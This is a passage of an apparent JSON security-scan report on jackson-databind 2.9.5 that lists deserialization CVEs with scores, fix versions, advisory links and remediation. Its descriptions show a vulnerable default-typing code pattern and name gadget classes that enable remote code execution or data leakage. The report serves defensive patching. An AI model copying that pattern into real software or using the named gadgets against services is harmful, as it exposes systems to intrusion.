          "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.7",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44",
          "https://lists.apache.org/thread.html/6a78f88716c3c57aa74ec05764a37ab3874769a347805903b393b286@%3Cdev.lucene.apache.org%3E",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E",
          "https://access.redhat.com/errata/RHBA-2019:0959",
          "https://access.redhat.com/errata/RHSA-2019:0782",
          "https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
          "https://www.debian.org/security/2019/dsa-4452",
          "https://security.netapp.com/advisory/ntap-20190530-0003",
          "https://lists.apache.org/thread.html/82b01bfb6787097427ce97cec6a7127e93718bc05d1efd5eaffc228f%40%3Cdev.lucene.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/issues/2097",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/82b01bfb6787097427ce97cec6a7127e93718bc05d1efd5eaffc228f@%3Cdev.lucene.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:4037",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20190530-0003/",
          "https://lists.apache.org/thread.html/ba973114605d936be276ee6ce09dfbdbf78aa56f6cdc6e79bfa7b8df%40%3Cdev.lucene.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3892",
          "https://github.com/advisories/GHSA-x2w5-5m2g-7h5m",
          "https://access.redhat.com/errata/RHSA-2019:1107",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://seclists.org/bugtraq/2019/May/68",
          "https://access.redhat.com/errata/RHSA-2019:1106",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://access.redhat.com/errata/RHSA-2019:1108",
          "https://www.oracle.com/technetwork/security-advisory/cpujan2019-5072801.html",
          "https://access.redhat.com/errata/RHSA-2019:1822",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://access.redhat.com/errata/RHSA-2019:1140",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2018-14720",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html",
          "https://lists.debian.org/debian-lts-announce/2019/03/msg00005.html",
          "https://lists.apache.org/thread.html/6a78f88716c3c57aa74ec05764a37ab3874769a347805903b393b286%40%3Cdev.lucene.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in multiple classes in Jackson-databind allows a remote attacker to perform XXE and leads to data leakage.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the following classes were found to be able to cause data leakage when used as Java gadgets -\n```\ncom.sun.deploy.security.ruleset.DRSHelper\n```\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes one of the above classes in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.\n-\tThe vulnerable Java service includes one of the following classes in its Java classpath\n```\nflex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor\nl```",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36182",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138341",
        "references": [
          "https://github.com/advisories/GHSA-89qr-369f-5m5x",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://github.com/FasterXML/jackson-databind/issues/3004",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://github.com/FasterXML/jackson-databind/commit/3ded28aece694d0df39c9f0fa1ff385b14a8656b",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36182",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://security.netapp.com/advisory/ntap-20210205-0005/",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://www.oracle.com//security-alerts/cpujul2021.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in dbcp2 in Apache Tomcat in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache Tomcat]( https://github.com/apache/tomcat) dbcp2 gadget, \nthe attacker might control the DB connection URL but cannot initiate the connection on demand. The real-world impact from these primitives, in the general case, is unknown.\n\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp2 in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp2 in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue cannot result in a severe impact (such as remote code execution)",
              "description": "In the general case, the gadget cannot cause remote code execution by itself",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)\n\n##### Deployment mitigations\n\nRemove `dbcp2` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-12384",
            "cvss_v2_score": "4.3",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:N",
            "cvss_v3_score": "5.9",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.9.1 might allow attackers to have a variety of impacts by leveraging failure to block the logback-core class from polymorphic deserialization. Depending on the classpath content, remote code execution may be possible.",
        "severity": "Medium",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.9.1]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-84285",
        "references": [
          "https://lists.apache.org/thread.html/56c8042873595b8c863054c7bfccab4bf2c01c6f5abedae249d914b9%40%3Cdev.tomee.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TXRVXNRFHJSQWFHPRJQRI5UPMZ63B544/",
          "https://github.com/advisories/GHSA-mph4-vhrx-mv67",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/940b4c3fef002461b89a050935337056d4a036a65ef68e0bbd4621ef@%3Cdev.struts.apache.org%3E",
          "https://lists.apache.org/thread.html/34717424b4d08b74f65c09a083d6dd1cb0763f37a15d6de135998c1d%40%3Cdev.tomee.apache.org%3E",
          "https://www.debian.org/security/2019/dsa-4542",
          "https://github.com/FasterXML/jackson-databind/commit/c9ef4a10d6f6633cf470d6a469514b68fa2be234",
          "https://access.redhat.com/errata/RHSA-2019:3200",
          "https://lists.apache.org/thread.html/e0733058c0366b703e6757d8d2a7a04b943581f659e9c271f0841dfe%40%3Cnotifications.geode.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2998",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://access.redhat.com/errata/RHSA-2019:3292",
          "https://github.com/FasterXML/jackson-databind/issues/2334",
          "https://blog.doyensec.com/2019/07/22/jackson-gadgets.html",
          "https://access.redhat.com/errata/RHSA-2019:3901",
          "https://seclists.org/bugtraq/2019/Oct/6",
          "https://security.netapp.com/advisory/ntap-20190703-0002",
          "https://lists.apache.org/thread.html/e0733058c0366b703e6757d8d2a7a04b943581f659e9c271f0841dfe@%3Cnotifications.geode.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UKUALE2TUCKEKOHE2D342PQXN4MWCSLC",
          "https://lists.apache.org/thread.html/87e46591de8925f719664a845572d184027258c5a7af0a471b53c77b%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/0d4b630d9ee724aee50703397d9d1afa2b2befc9395ba7797d0ccea9@%3Cdev.tomee.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TXRVXNRFHJSQWFHPRJQRI5UPMZ63B544",
          "https://access.redhat.com/errata/RHSA-2019:2938",
          "https://access.redhat.com/errata/RHSA-2019:2936",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OVRZDN2T6AZ6DJCZJ3VSIQIVHBVMVWBL",
          "https://lists.apache.org/thread.html/3f99ae8dcdbd69438cb733d745ee3ad5e852068490719a66509b4592@%3Ccommits.cassandra.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/compare/74b90a4...a977aad",
          "https://access.redhat.com/errata/RHSA-2019:4352",
          "https://lists.apache.org/thread.html/56c8042873595b8c863054c7bfccab4bf2c01c6f5abedae249d914b9@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/2d2a76440becb610b9a9cb49b15eac3934b02c2dbcaacde1000353e4@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/34717424b4d08b74f65c09a083d6dd1cb0763f37a15d6de135998c1d@%3Cdev.tomee.apache.org%3E",
          "https://doyensec.com/research.html",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://lists.apache.org/thread.html/5ecc333113b139429f4f05000d4aa2886974d4df3269c1dd990bb319@%3Cdev.tomee.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://access.redhat.com/errata/RHSA-2019:2720",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/0d4b630d9ee724aee50703397d9d1afa2b2befc9395ba7797d0ccea9%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/2d2a76440becb610b9a9cb49b15eac3934b02c2dbcaacde1000353e4%40%3Cdev.tomee.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2019/06/msg00019.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-12384",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/87e46591de8925f719664a845572d184027258c5a7af0a471b53c77b@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/ee0a051428d2c719acfa297d0854a189ea5e284ef3ed491fa672f4be@%3Cdev.tomee.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OVRZDN2T6AZ6DJCZJ3VSIQIVHBVMVWBL/",
          "https://access.redhat.com/errata/RHSA-2019:3297",
          "https://security.netapp.com/advisory/ntap-20190703-0002/",
          "https://lists.apache.org/thread.html/5fc0e16b7af2590bf1e97c76c136291c4fdb244ee63c65c485c9a7a1@%3Cdev.tomee.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.apache.org/thread.html/5fc0e16b7af2590bf1e97c76c136291c4fdb244ee63c65c485c9a7a1%40%3Cdev.tomee.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2937",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UKUALE2TUCKEKOHE2D342PQXN4MWCSLC/",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1820",
          "https://lists.apache.org/thread.html/3f99ae8dcdbd69438cb733d745ee3ad5e852068490719a66509b4592%40%3Ccommits.cassandra.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://access.redhat.com/errata/RHSA-2019:2935",
          "https://lists.apache.org/thread.html/ee0a051428d2c719acfa297d0854a189ea5e284ef3ed491fa672f4be%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/940b4c3fef002461b89a050935337056d4a036a65ef68e0bbd4621ef%40%3Cdev.struts.apache.org%3E",
          "https://lists.apache.org/thread.html/5ecc333113b139429f4f05000d4aa2886974d4df3269c1dd990bb319%40%3Cdev.tomee.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in multiple classes in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the following classes were found to be able to cause remote code execution when used as Java gadgets -\n```\nch.qos.logback.core.db.DriverManagerConnectionSource\n```\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes one of the above classes in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.\n-\tThe vulnerable Java service includes one of the following classes in its Java classpath\n```\nch.qos.logback.core.db.DriverManagerConnectionSource\nl```",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-20330",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.2 lacks certain net.sf.ehcache blocking.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.4]",
              "[2.7.9.7]",
              "[2.8.11.5]",
              "[2.9.10.2]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-93354",
        "references": [
          "https://lists.apache.org/thread.html/ra5ce96faec37c26b0aa15b4b6a8b1cbb145a748653e56ae83e9685d0%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.10.1...jackson-databind-2.9.10.2",
          "https://lists.apache.org/thread.html/r5c3644c97f0434d1ceb48ff48897a67bdbf3baf7efbe7d04625425b3@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r428735963bee7cb99877b88d3228e28ec28af64646455c4f3e7a3c94%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/ra2e572f568de8df5ba151e6aebb225a0629faaf0476bf7c7ed877af8%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd1f346227e11fc515914f3a7b20d81543e51e5822ba71baa0452634a@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r2c77dd6ab8344285bd8e481b57cf3029965a4b0036eefccef74cdd44@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r107c8737db39ec9ec4f4e7147b249e29be79170b9ef4b80528105a2d%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r5d3d10fdf28110da3f9ac1b7d08d7e252f98d7d37ce0a6bd139a2e4f%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r107c8737db39ec9ec4f4e7147b249e29be79170b9ef4b80528105a2d@%3Cdev.zookeeper.apache.org%3E",
          "https://github.com/advisories/GHSA-gww7-p5w4-wrfv",
          "https://lists.apache.org/thread.html/rd1f346227e11fc515914f3a7b20d81543e51e5822ba71baa0452634a%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r7a0821b44247a1e6c6fe5f2943b90ebc4f80a8d1fb0aa9a8b29a59a2@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd6c6fef14944f3dcfb58d35f9317eb1c32a700e86c1b5231e45d3d0b%40%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/ra2e572f568de8df5ba151e6aebb225a0629faaf0476bf7c7ed877af8@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r7a0821b44247a1e6c6fe5f2943b90ebc4f80a8d1fb0aa9a8b29a59a2%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r909c822409a276ba04dc2ae31179b16f6864ba02c4f9911bdffebf95%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r707d23bb9ee245f50aa909add0da6e8d8f24719b1278ddd99d2428b2@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/ra8a80dbc7319916946397823aec0d893d24713cbf7b5aee0e957298c%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r707d23bb9ee245f50aa909add0da6e8d8f24719b1278ddd99d2428b2%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd49cfa41bbb71ef33b53736a6af2aa8ba88c2106e30f2a34902a87d2@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r5c14fdcabdeaba258857bcb67198652e4dce1d33ddc590cd81d82393%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r392099ed2757ff2e383b10440594e914d080511d7da1c8fed0612c1f%40%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r909c822409a276ba04dc2ae31179b16f6864ba02c4f9911bdffebf95@%3Cissues.zookeeper.apache.org%3E",
